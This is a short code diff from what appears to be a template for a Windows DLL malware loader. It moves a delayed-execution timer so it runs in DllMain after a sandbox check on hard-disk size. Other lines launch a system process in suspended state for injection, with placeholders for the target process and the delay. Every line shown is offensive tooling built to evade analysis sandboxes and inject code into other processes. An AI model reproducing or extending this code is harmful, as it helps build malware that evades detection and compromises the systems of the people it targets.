@@ -224,8 +224,7 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
         CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
         HANDLE victimProcess = pi.hProcess;
         HANDLE threadHandle = pi.hThread;
-        //delay execution
-        timing_CreateWaitableTimer({time});
+      
 
                     /*++
 
@@ -276,7 +275,8 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
         //sandbox check for harddisk size
         gensandbox_drive_size();
-
+        //delay execution
+        timing_CreateWaitableTimer({time});
     
         hThread = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
         CloseHandle(hThread);
